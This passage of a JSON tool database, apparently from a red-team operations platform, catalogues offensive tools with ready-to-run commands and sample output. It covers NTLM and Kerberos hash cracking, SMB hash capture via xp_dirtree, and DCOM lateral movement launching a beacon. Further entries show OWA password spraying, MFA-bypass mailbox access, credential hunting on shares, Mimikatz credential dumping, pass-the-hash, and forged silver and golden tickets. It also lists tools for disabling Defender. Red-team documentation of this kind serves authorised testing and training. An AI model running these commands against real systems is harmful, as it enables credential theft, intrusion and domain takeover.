    "content": "# Hashcat\n\n\n## Commands\n- '-a 0' specifies the wordlist attack mode.\n- '-m 1000' specifies that the hash is NTLM.\n- 'C:\\Temp\\ntlm.txt' is a text file containing the NTLM hash to crack.\n- 'D:\\Tools\\rockyou.txt' is the wordlist.\n- '-r rules\\add-year.rule' is our custom rule file\n\n## Bruteforce NTLM\n- '-a 3' specifies the mask attack.\n- '?u?l?l?l?l?l?l?l?d' is the mask.\n\n| ?   | Charset                                |\n| --- | -------------------------------------- |\n| l   | abcdefghijklmnopqrstuvwxyz             |\n| u   | ABCDEFGHIJKLMNOPQRSTUVWXYZ             |\n| d   | 0123456789                             |\n| h   | 0123456789abcdef                       |\n| H   | 0123456789ABCDEF                       |\n| s   | '!\"#$%&'()*+,-./:;<=>?@[\\]^_''{ \\| }~' |\n| a   | ?l?u?d?s                               |\n| b   | 0x00 - 0xff                            |\n\n## [[Crack Credentials]]\n## Cracking NTLM\n''''''sh\nhashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 1000 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt\n''''''\n\n''''''beacon\nhashcat.exe -a 3 -m 1000 C:\\Temp\\ntlm.txt ?u?l?l?l?l?l?l?l?d\n''''''\n\n## Cracking krb5tgs\n''''''sh\nhashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 13100 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt\n''''''\n\n## Cracking krb5asrep\n''''''sh\nhashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 18200 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt\n''''''\n\n## Cracking netntlmv2\n'''sh\nhashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 5600 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt\n'''\n\n\n",
    "commands": [
      {
        "id": "4dcdc386-2ceb-431c-acf6-a9c2d55130e9",
        "name": "Cracking NTLM",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "hashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 1000 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt"
      },
      {
        "id": "e2ec4a29-5912-4fec-8b42-339a639391a7",
        "name": "Bruteforce NTLM",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "hashcat.exe -m 1000 -a 3 hash.txt -1 ?l?d?s ?1?1?1?1?1?1"
      },
      {
        "id": "da7d5aea-fb2f-411d-bc82-b59f1c96a552",
        "name": "Cracking krb5tgs",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "hashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 13100 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt"
      },
      {
        "id": "742234d5-3e4a-4261-b2b7-dad52e4200ae",
        "name": "Cracking krb5asrep",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "hashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 18200 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt"
      },
      {
        "id": "2ae08370-f66a-4fac-bad8-da25f0af8ed9",
        "name": "Cracking netntlmv2",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "hashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 5600 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt"
      },
      {
        "id": "64f215f3-7434-44fc-8dc1-2118e7db6a1c",
        "name": "Bruteforce Rules",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "-a 3 specifies the mask attack.\n?u?l?l?l?l?l?l?l?d is the mask.\n\n?\tCharset\n------------------------\nl\tabcdefghijklmnopqrstuvwxyz\nu\tABCDEFGHIJKLMNOPQRSTUVWXYZ\nd\t0123456789\nh\t0123456789abcdef\nH\t0123456789ABCDEF\ns\t!\"#$%&'()*+,-./:;<=>?@[\\]^_''{ | }~\na\t?l?u?d?s\nb\t0x00 - 0xff"
      }
    ]
  },
  {
    "name": "HeidiSQL",
    "phases": [
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://www.heidisql.com/",
    "description": "SQL client to work with [[MS SQL Servers]]",
    "undetected": [],
    "detected": [],
    "content": "# HeidiSQL\n\n![](/Images/Pasted%20image%2020220321162707.png)\n\n## [[MS SQL Servers]]\nSQL client to work with MS SQL Servers\n\n",
    "commands": []
  },
  {
    "name": "InveighZero",
    "phases": [
      "07. Lateral Movement",
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/Kevin-Robertson/InveighZero",
    "description": "Inveigh is a cross-platforms .NET IPv4/IPv6 machine-in-the-middle tool.",
    "undetected": [],
    "detected": [],
    "content": "# InveighZero\n\n## [[NTLM Relaying]]\nCapture NetNTLM hash\nThis should be run as a local admin.\n\n\u2139 InveighZero will ignore traffic coming from accounts that are generally deemed to be \"uncrackable\" such as computer accounts.\n```beacon\nbeacon> execute-assembly C:\\Tools\\InveighZero\\Inveigh\\bin\\Debug\\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N\n\n[*] Inveigh 0.913 started at 2022-03-10T18:02:36\n[+] Elevated Privilege Mode = Enabled\n[+] Primary IP Address = 10.10.17.231\n[+] Spoofer IP Address = 10.10.17.231\n[+] Packet Sniffer = Enabled\n[+] DHCPv6 Spoofer = Disabled\n[+] DNS Spoofer = Disabled\n[+] LLMNR Spoofer = Disabled\n[+] LLMNRv6 Spoofer = Disabled\n[+] mDNS Spoofer = Disabled\n[+] NBNS Spoofer = Disabled\n[+] HTTP Capture = Disabled\n[+] Proxy Capture = Disabled\n[+] WPAD Authentication = NTLM\n[+] WPAD NTLM Authentication Ignore List = Firefox\n[+] SMB Capture = Enabled\n[+] Machine Account Capture = Disabled\n[+] File Output = Disabled\n[+] Log Output = Enabled\n[+] Pcap Output = Disabled\n[+] Previous Session Files = Not Found\n[*] Press ESC to access console\n```\n\n## [[SQL NetNTLM Capture]]\nWe can use [[InveighZero]] to listen to the incoming requests (this should be run as a local admin).\n1. [[InveighZero#Capture NetNTLM hash]]\n2. Run `xp_dirtree` to connect the sql server to your machine running [[InveighZero]]\n>EXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1\n3. Receive hash on the attacking machine\n```beacon\n[+] [2022-05-14T15:33:49] TCP(445) SYN packet from 10.10.1.20:50323\n[+] [2022-05-14T15:33:49] SMB(445) negotiation request detected from 10.10.1.20:50323\n[+] [2022-05-14T15:33:49] SMB(445) NTLM challenge 3006547FFC8E90D8 sent to 10.10.1.20:50323\n[+] [2022-05-14T15:33:49] SMB(445) NTLMv2 captured for EDU\\svc_mssql from 10.10.1.20(SRV1):50323:\nsvc_mssql::EDU:[...snip...]\n```\n4. [[Hashcat#Cracking netntlmv2]]\n\n\n",
    "commands": [],
    "latest_commit": "2022-08-28T22:17:52Z"
  },
  {
    "name": "Invoke-DCOM",
    "phases": [
      "01. Initial Access",
      "07. Lateral Movement"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1",
    "description": "Lateral Move via DCOM.",
    "undetected": [],
    "detected": [],
    "content": "# Invoke-DCOM\n\n## [[DCOM]]\n'''\nImport-Module .\\Invoke-DCOM.ps1\nInvoke-DCOM -ComputerName '192.168.2.100' -Method MMC20.Application -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '192.168.2.100' -Method ExcelDDE -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '192.168.2.100' -Method ServiceStart \"MyService\"\n'''\n\nTo interact over Distributed Component Object Model (DCOM), we must use an external tool such as [[Invoke-DCOM]].\n''''''beacon\nbeacon> powershell-import C:\\Tools\\Invoke-DCOM.ps1\nbeacon> powershell Invoke-DCOM -ComputerName srv1 -Method MMC20.Application -Command C:\\Windows\\beacon-smb.exe\nCompleted\n\nbeacon> link srv1\n[+] established link to child beacon: 10.10.1.20\n''''''\n\nDCOM is more complicated to detect, since each \"Method\" works in a different way. In the particular case of 'MMC20.Application', the spawned process will be a child of 'mmc.exe'.\n\n''''''\nProcessId: 952\nImage: C:\\Windows\\beacon-smb.exe\nParentImage: C:\\Windows\\System32\\mmc.exe\n''''''  \nProcesses started via DCOM may also be seen where the parent is 'svchost.exe' (started with the command line '-k DcomLaunch').\n\n",
    "commands": [
      {
        "id": "cfb6398e-d128-41e6-8e25-9f3effdcf564",
        "name": "Import",
        "description": "Import module",
        "tag": "",
        "results": [],
        "cmd": "Import-Module .\\Invoke-DCOM.ps1"
      },
      {
        "id": "ffd4d5ff-e7cf-4621-b07d-f69d9687b635",
        "name": "Execute command via MMC20.Application",
        "description": "Svchost spawns mmc.exe which opens a listening port via RPC binding",
        "tag": "",
        "results": [],
        "cmd": "Invoke-DCOM -ComputerName '192.168.2.100' -Method MMC20.Application -Command \"calc.exe\""
      },
      {
        "id": "ded4b315-b2e7-435b-bb11-d21234a1b32c",
        "name": "Execute command via ExcelDDE",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Invoke-DCOM -ComputerName '192.168.2.100' -Method ExcelDDE -Command \"calc.exe\""
      },
      {
        "id": "16dee6f1-13c1-4e1c-a5e1-52a17830506b",
        "name": "Execute command via ServiceStart ",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Invoke-DCOM -ComputerName '192.168.2.100' -Method ServiceStart \"MyService\""
      }
    ],
    "latest_commit": "2020-01-19T22:50:59Z"
  },
  {
    "name": "Invoke-Obfuscation",
    "phases": [
      "10. Bypassing Defenses"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/danielbohannon/Invoke-Obfuscation",
    "description": "",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Obfuscation]]\nImport-Module ./Invoke-Obfuscation.psd1\nInvoke-Obfuscation\n\n",
    "commands": [],
    "latest_commit": "2020-02-26T21:50:54Z"
  },
  {
    "name": "John the Ripper",
    "phases": [
      "02. Reconnaissance",
      "08. Credentials & User Impersonation"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://www.openwall.com/john/",
    "description": "John the Ripper is an Open Source password security auditing and password recovery tool available for many operating systems.",
    "undetected": [],
    "detected": [],
    "content": "# John the Ripper\n\n\n## [[Crack Credentials]]\nCracking netntlmv2\n'''sh\n--format=netntlmv2 --wordlist=wordlist svc_mssql-netntlmv2\n'''\n\n\n",
    "commands": [
      {
        "id": "ff58951f-1f3f-4ba1-b0de-a11fe3a78740",
        "name": "Cracking netntlmv2",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "john --format=netntlmv2 --wordlist=wordlist svc_mssql-netntlmv2"
      },
      {
        "id": "2d47de76-3f5c-4fc6-8aae-e2df72708d60",
        "name": "Cracking Secretsdump",
        "description": "",
        "tag": "",
        "results": [
          "CRED:PASS:PLAIN"
        ],
        "cmd": "john --format=mscash2 --wordlist=/root/mydict.txt /root/2crack.txt"
      }
    ]
  },
  {
    "name": "Kill Defender",
    "phases": [
      "10. Bypassing Defenses"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/pwn1sher/KillDefender",
    "description": "Removing its token privileges and lowering the token integrity to untrusted",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Token Sandboxing]]\n> killdefender.exe <PID>\n\n",
    "commands": [],
    "latest_commit": "2022-06-28T15:53:59Z"
  },
  {
    "name": "ldapmodify",
    "phases": [
      "05. Privilege Escalation",
      "07. Lateral Movement",
      "04. Persistence"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows",
      "Linux"
    ],
    "source": "https://www.thegeekstuff.com/2015/02/openldap-add-users-groups/",
    "description": "Add user to OU",
    "undetected": [],
    "detected": [],
    "content": "# ldapadd\n\n## [[Create Account]]\nAdd a new user to the AD via ldap\n1. Create the file called user.ldif.txt\n    ```bash\n    # jdoe, Users, maxcrc.com\n    dn: uid=jdoe,ou=People,dc=maxcrc,dc=com \n    ObjectCIass: posixAccount \n    objectC1ass: top \n    objectC1ass: inetOrgPerson \n    givenName: John \n    sn: Doe \n    uid: jdoe \n    homeDirectory: /home/jdoe \n    cn: jdoe \n    uidNumber: 18735 \n    gidNumber: 500\n    ```\n2. Apply the file and add an element to the LDAP:\n    `.\\ldapmodify.exe -a -x -h 127.0.0.1 -D cn=Manager,dc=maxcrc,dc=com -W -f .\\user.ldif.txt`\n\n\n",
    "commands": []
  },
  {
    "name": "ldapsearch",
    "phases": [
      "02. Reconnaissance",
      "08. Credentials & User Impersonation"
    ],
    "category": "Enumeration",
    "stealthy": true,
    "platforms": [
      "Linux"
    ],
    "source": "https://linux.die.net/man/1/ldapsearch",
    "description": "Allows you to specify custom LDAP queries",
    "undetected": [],
    "detected": [],
    "content": "# ldapsearch\n\n## [[Validate Credentials]]\n1. Get [[Domain Controller]]\n2. Login\n    '.\\\\ldapsearch.exe -x -h 127.0.0.1 -b dc=maxcrc,dc=com -w PW -D \"cn=admin\"'\n\n3. Flags\n    * x: anonymous connect\n    * h: server\n    * b: root (domain component)\n    * w: password\n    * W: interactive password\n    * D: binddn - user\n\n## [[User enum]]\n> ldapsearch -x -h <ip> -s base\n\n",
    "commands": [
      {
        "id": "f3f95224-0c24-4a55-8c3b-4fea8d7ae490",
        "name": "Login",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": ".\\\\ldapsearch.exe -x -h 127.0.0.1 -b dc=maxcrc,dc=com -w PW -D \"cn=admin\"",
        "requirements": {
          "tag": "INTEL:DOMAIN:DC"
        }
      },
      {
        "id": "e567991e-b395-4f77-ae7c-05961fbfd03d",
        "name": "User enum",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "ldapsearch -x -h <ip> -s base",
        "requirements": {
          "tag": "INTEL:DOMAIN:DC"
        }
      }
    ]
  },
  {
    "name": "linedInt",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "OSINT",
    "stealthy": false,
    "platforms": [
      "Python"
    ],
    "source": "https://github.com/vysecurity/LinkedInt",
    "description": "LinkedIn Recon Tool",
    "undetected": [],
    "detected": [],
    "content": "\n## [[LinkedIn]]\n\n",
    "commands": [
      {
        "id": "f570a99e-7685-4e71-9287-d7af8adfb4ea",
        "name": "Install",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "git clone https://github.com/vysecurity/LinkedInt\ncd LinkedInt\npip install -r requirements.txt\n\n1. Put in LinkedIn credentials in LinkedInt.cfg\n2. Put Hunter.io API key in LinkedInt.cfg"
      },
      {
        "id": "02da6bcd-848b-484c-b4cf-c4dc1ac948fb",
        "name": "Fetch people interactively",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "LinkedInt.py"
      }
    ],
    "latest_commit": "2023-03-06T13:05:38Z"
  },
  {
    "name": "LyncSniper",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "OSINT",
    "stealthy": false,
    "platforms": [
      "Python"
    ],
    "source": "https://github.com/0x802/LinkSniper",
    "description": "It takes all links from target, if the link belongs to a target like subdomain, then it will work on it. If there was another field, it wouldn't add it to the output, and this process continues until the links map is complete",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Exposed Machines]]\n\n",
    "commands": [
      {
        "id": "79bfc7a5-811d-4d7c-a097-b5ec220bd1a0",
        "name": "Spider or repeater to find all links in website.",
        "description": "",
        "tag": "",
        "results": [
          "INTEL:WEB:LINKS"
        ],
        "cmd": "python3 LinkSniper.py https://www.google.com\n"
      }
    ],
    "latest_commit": "2021-02-07T01:03:13Z"
  },
  {
    "name": "MailSniper",
    "phases": [
      "01. Initial Access",
      "08. Credentials & User Impersonation"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/dafthack/MailSniper",
    "description": "MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used as a non-administrative user to search their own email or by an Exchange administrator to search the mailboxes of every user in a domain.",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Internal Phishing]] [[Phishing]]\nGet internal domain names\n''''''\nipmo C:\\Tools\\MailSniper\\MailSniper.ps1\nInvoke-DomainHarvestOWA -ExchHostname 10.10.15.100\n\n[*] Harvesting domain name from the server at 10.10.15.100\nThe domain appears to be: EDU or evil.corp\n''''''\n\n Password spray\n''''''\nInvoke-PasswordSprayOWA -ExchHostname 10.10.15.100 -UserList .\\valid.txt -Password Summer2022\n\n[*] Now spraying the OWA portal at https://10.10.15.100/owa/\n[*] SUCCESS! User:EDU\\patrick Password:Summer2022\n[*] A total of 1 credentials were obtained.\n''''''\n\n\n",
    "commands": [
      {
        "id": "77b80a4a-d8e9-48aa-b9d1-f201bd7c68ae",
        "name": "Get internal domain names via timingattack",
        "description": "",
        "tag": "",
        "results": [
          "INTEL:DOMAIN:DOMAINS"
        ],
        "cmd": "ipmo C:\\Tools\\MailSniper\\MailSniper.ps1\nInvoke-DomainHarvestOWA -ExchHostname mail.domain.com -OutFile\npotential_domains.txt -CompanyName \"Target Name\"",
        "requirements": {
          "tag": "SERVICE:OWA"
        }
      },
      {
        "id": "90f47a63-a165-4864-a3b1-5ef66ff184ef",
        "name": "Password Spray OWA",
        "description": "",
        "tag": "",
        "results": [
          "CRED:PASS:PLAIN"
        ],
        "cmd": "Invoke-PasswordSprayOWA -ExchHostname <10.10.15.100> -UserList <.\\valid.txt> -Password <Summer2022> -Threads 15 -OutFile owa-sprayed-creds.txt",
        "requirements": {
          "tag": "SERVICE:OWA"
        }
      },
      {
        "id": "94a3d9b5-f730-4389-8256-54c9ff91856b",
        "name": "Enumerate usernames based on timingattack",
        "description": "",
        "tag": "",
        "results": [
          "INTEL:DOMAIN:USERS"
        ],
        "cmd": "Invoke-UsernameHarvestOWA -UserList <.\\username_list.txt> -ExchHostname\n<mail.domain.com> -Domain <the_identified_internal_domain_name< -OutFile\n<potential_usernames.txt>",
        "requirements": {
          "tag": "SERVICE:OWA"
        }
      },
      {
        "id": "a2abdd17-8adc-4597-9c7a-7e0280249f0f",
        "name": "Password Spray EWS",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Invoke-PasswordSprayEWS -ExchHostname <mail.domain.com> -UserList <userlist.txt>\n-Password <Fall2016> -Threads 15 -OutFile sprayed-ews-creds.txt",
        "requirements": {
          "tag": "SERVICE:OWA"
        }
      },
      {
        "id": "7b4bb785-c4f2-4ff0-a901-a9199896ec54",
        "name": "Get Global Address List (GAL)",
        "description": "",
        "tag": "",
        "results": [
          "INTEL:DOMAIN:USERS"
        ],
        "cmd": "Get-GlobalAddressList -ExchHostname <mail.domain.com> -UserName <domain\\username> -Password <Fall2016> -OutFile global-address-list.txt",
        "requirements": {
          "tag": "SERVICE:OWA"
        }
      },
      {
        "id": "1b6977a0-9ae2-4ca2-bc9f-a783fb79c09f",
        "name": "Access mailbox through EWS (bypass MFA)",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Invoke-SelfSearch -Mailbox <target@domain.com> -ExchHostname <mail.domain.com> -remote\n\n\u2022.PARAMETER Terms\nCertain terms to search through each email subject and body for.\n\u2022.PARAMETER Folder\nThe folder of each mailbox to search.\n\u2022.PARAMETER Regex\nThe regex parameter allows for the use of regular expressions when doing searches.\n\u2022.PARAMETER CheckAttachments\nThis option will attempt to search through the contents of email attachments in\naddition to the default body/subject.",
        "requirements": {
          "tag": "SERVICE:OWA"
        }
      }
    ],
    "latest_commit": "2022-10-20T08:13:33Z"
  },
  {
    "name": "MANSPIDER",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Python"
    ],
    "source": "https://github.com/blacklanternsecurity/MANSPIDER",
    "description": "Spider entire networks for juicy files sitting on SMB shares. Search filenames or file content - regex supported!",
    "undetected": [],
    "detected": [],
    "content": "## Installation\n'''sh\n(Optional) Install these dependencies to add additional file parsing capability:\n# for images (png, jpeg)\n$ sudo apt install tesseract-ocr\n\n# for legacy document support (.doc)\n$ sudo apt install antiword\nInstall manspider (please be patient, this can take a while):\n\n$ pip install pipx\n$ pipx install git+https://github.com/blacklanternsecurity/MANSPIDER\n'''\n\n## [[Credentials]]\nSearch the network for filenames that may contain creds\n>manspider 192.168.0.0/24 -f passw user admin account network login logon cred -d evilcorp -u admin -p password\n\nSearch for XLSX files containing \"password\"\n>manspider share.evil.corp -c password -e xlsx -d evilcorp -u admin -p password\n\nSearch for interesting file extensions\n> manspider share.evil.corp -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config -d evilcorp -u admin -p password\n\n",
    "commands": [
      {
        "id": "e15907bc-e26c-4462-b8c5-ed5a740917eb",
        "name": "Install",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "sudo apt install tesseract-ocr\nsudo apt install antiword\npip install pipx\npipx install git+https://github.com/blacklanternsecurity/MANSPIDER"
      },
      {
        "id": "a562be37-6d72-4372-adbc-b78eee0a91a4",
        "name": "Search the network for filenames that may contain creds",
        "description": "",
        "tag": "",
        "results": [
          "CRED:PASS:PLAIN"
        ],
        "cmd": "manspider 192.168.0.0/24 -f passw user admin account network login logon cred -d evilcorp -u admin -p password"
      },
      {
        "id": "6027516d-5e31-4074-9042-a44723327416",
        "name": "Search for XLSX files containing \"password\"",
        "description": "",
        "tag": "",
        "results": [
          "CRED:PASS:PLAIN"
        ],
        "cmd": "manspider share.evil.corp -c password -e xlsx -d evilcorp -u admin -p password"
      },
      {
        "id": "6b5dc298-ee54-4b8f-be54-7843b7ff873c",
        "name": "Search for interesting file extensions",
        "description": "",
        "tag": "",
        "results": [
          "CRED:PASS:PLAIN"
        ],
        "cmd": "manspider share.evil.corp -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config -d evilcorp -u admin -p password"
      }
    ],
    "latest_commit": "2023-05-01T23:27:51Z"
  },
  {
    "name": "MASSCAN",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux",
      "Windows"
    ],
    "source": "https://github.com/robertdavidgraham/masscan",
    "description": "This is an Internet-scale port scanner. It can scan the entire Internet in under 5 minutes, transmitting 10 million packets per second, from a single machine.",
    "undetected": [],
    "detected": [],
    "content": "\n## [[IP Ranges]]\n\n",
    "commands": [],
    "latest_commit": "2023-04-20T23:13:10Z"
  },
  {
    "name": "Metagoofil",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Python"
    ],
    "source": "https://github.com/opsdisk/metagoofil",
    "description": "metagoofil searches Google for specific types of files being publicly hosted on a web site and optionally downloads them to your local box. This is useful for Open Source Intelligence gathering, penetration tests, or determining what files your organization is leaking to search indexers like Google.",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Leaked Files]] [[Metadata]]\n\n",
    "commands": [],
    "latest_commit": "2022-10-09T21:42:46Z"
  },
  {
    "name": "MFAsweep",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/dafthack/MFASweep",
    "description": "MFASweep is a PowerShell script that attempts to log in to various Microsoft services using a provided set of credentials and will attempt to identify if MFA is enabled. Depending on how conditional access policies and other multi-factor authentication settings are configured some protocols may end up being left single factor. It also has an additional check for ADFS configurations and can attempt to log in to the on-prem ADFS server if detected.",
    "undetected": [],
    "detected": [],
    "content": "",
    "commands": [
      {
        "id": "01e1b753-9768-4703-9e37-982380fb659c",
        "name": "Check MFA for MS Services",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Invoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2020 "
      }
    ],
    "latest_commit": "2023-01-31T22:52:19Z"
  },
  {
    "name": "Mimikatz",
    "phases": [
      "02. Reconnaissance",
      "04. Persistence",
      "06. Domain Enumeration",
      "08. Credentials & User Impersonation",
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/gentilkiwi/mimikatz",
    "description": "It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets.",
    "undetected": [],
    "detected": [],
    "content": "# Mimikatz\n\n\n\n## Commands\n``````powershell\n# Logonpasswords\nmimikatz sekurlsa::logonpasswords\n# Logonpasswords on lsass dmp\nmimikatz \"log log.txt\" \"sekurlsa::minidump C:\\Users\\patri\\Downloads\\sql2.bin\" \"sekurlsa::logonPasswords\"\n# Get [[Cached Domain Credentials]]\nmimikatz lsadump::cache\n# Get [[eKeys]] Kerberos aes265_hmac\nmimikatz sekurlsa::ekeys\n# Get local account hashes [[Security Account Manager]]\nmimikatz lsadump::sam\n# Get [[Data Protection API (DPAPI)]]\nmimikatz vault::list\n``````\n\n## Spawn process with injected credentials\nRequires admin\n``````sh\nmimikatz # privilege::debug\nPrivilege '20' OK\n\nmimikatz # sekurlsa::pth /user:patrick /domain:edu.evil.corp /ntlm:2e8a408a8aec852ef2e458b938b8c071 /run:\"C:\\windows\\system32\\mmc.exe C:\\windows\\system32\\dsa.msc\"\nuser    : patrick\ndomain  : edu.evil.corp\nprogram : C:\\windows\\system32\\mmc.exe C:\\windows\\system32\\dsa.msc\nimpers. : no\nNTLM    : 2e8a408a8aec852ef2e458b938b8c071\n  |  PID  13608\n  |  TID  23228\n  |  LSA Process is now R/W\n  |  LUID 0 ; 3731125840 (00000000:de647650)\n  \\_ msv1_0   - data copy @ 000002B378344C10 : OK !\n  \\_ kerberos - data copy @ 000002B37859B388\n   \\_ des_cbc_md4       -> null\n   \\_ des_cbc_md4       OK\n   \\_ des_cbc_md4       OK\n   \\_ des_cbc_md4       OK\n   \\_ des_cbc_md4       OK\n   \\_ des_cbc_md4       OK\n   \\_ des_cbc_md4       OK\n   \\_ *Password replace @ 000002B378209E28 (32) -> null\n``````\n\n## [[Silver Ticket]]\n### Create silver ticket\n1. [[DCSync]] the krbtgt user\n2. Generate [[Silver Ticket]]\nWhere:\n-   `/user` is the username to impersonate.\n-   `/domain` is the current domain name.\n-   `/sid` is the current domain SID.\n-   `/target` is the target machine.\n-   `/aes256` is the AES256 key for the target machine.\n-   `/ticket` is the filename to save the ticket as.\n```beacon\nmimikatz # kerberos::golden /user:Administrator /domain:edu.evil.corp /sid:S-1-5-21-3263068140-2042698922-2891547269 /target:srv2 /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi\nUser      : Administrator\nDomain    : edu.evil.corp (EDU)\nSID       : S-1-5-21-3263068140-2042698922-2891547269\nUser Id   : 500\nGroups Id : *513 512 520 518 519\nServiceKey: babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 - aes256_hmac\nService   : cifs\nTarget    : srv2\nLifetime  : 25/05/2022 10:30:08 ; 23/05/2031 10:30:08 ; 23/05/2031 10:30:08\n-> Ticket : srv2-cifs.kirbi\n\n * PAC generated\n * PAC signed\n * EncTicketPart generated\n * EncTicketPart encrypted\n * KrbCred generated\n\nFinal Ticket Saved to file !\n```\n3. [[Use Kerberos ticket (kirbi)]]\n\nHere are some useful ticket combinations:\n| Technique         | Required Service Tickets |\n| ----------------- | ------------------------ |\n| psexec            | CIFS                     |\n| winrm             | HOST & HTTP              |\n| dcsync (DCs only) | LDAP                     | \n\n## [[Golden Ticket]]\n### Create golden ticket (user)\n#OPSEC Specify the lifetime (mimikatz does abnormal 10 years)\nUse the `/startoffset`, `/endin` and `/renewmax` parameters to control the start offset, duration and the maximum renewals (all in minutes).\n\n1. Get DC [[PowerView#Get-DomainController]] \n2. [[PowerView#Get-DomainSID]]\n3. [[DCSync]] the krbtgt user\n4. Generate [[Golden Ticket]] as follows:\nWhere:\n-   `/user` is the username to impersonate : see 2\n-   `/domain` is the current domain name : see 1\n-   `/sid` is the current domain SID. : see 2\n-   `/aes256` is the AES256 key for the krbtgt : see 3\n-   `/ticket` is the filename to save the ticket as.\n```beacon\nmimikatz # kerberos::golden /user:Administrator /domain:edu.evil.corp /sid:S-1-5-21-3263068140-2042698922-2891547269 /aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /ticket:golden.kirbi\nUser      : Administrator\nDomain    : edu.evil.corp (EDU)\nSID       : S-1-5-21-3263068140-2042698922-2891547269\nUser Id   : 500\nGroups Id : *513 512 520 518 519\nServiceKey: 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa - aes256_hmac\nLifetime  : 3/11/2022 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM\n-> Ticket : golden.kirbi\n\n * PAC generated\n * PAC signed\n * EncTicketPart generated\n * EncTicketPart encrypted\n * KrbCred generated\n\nFinal Ticket Saved to file !\n```\n3. [[Use Kerberos ticket (kirbi)]]\n\n## [[Parent-Child]]\nrevert via:\n>beacon> rev2self\n\n### Create golden ticket ParentChild\n```beacon\npowershell Get-DomainGroup -Identity \"Domain Admins\" -Domain rto.local -Properties ObjectSid\nobjectsid                                    \n---------                                    \nS-1-5-21-2323903455-1895497758-3703895482-512\n\npowershell Get-DomainGroup -Identity \"Domain Admins\" -Domain child.rto.local -Properties ObjectSid\nobjectsid                                   \n---------                                   \nS-1-5-21-1886337448-2504686659-850325809-512\n\nhashdump\nor\nmimikatz lsadump::dcsync 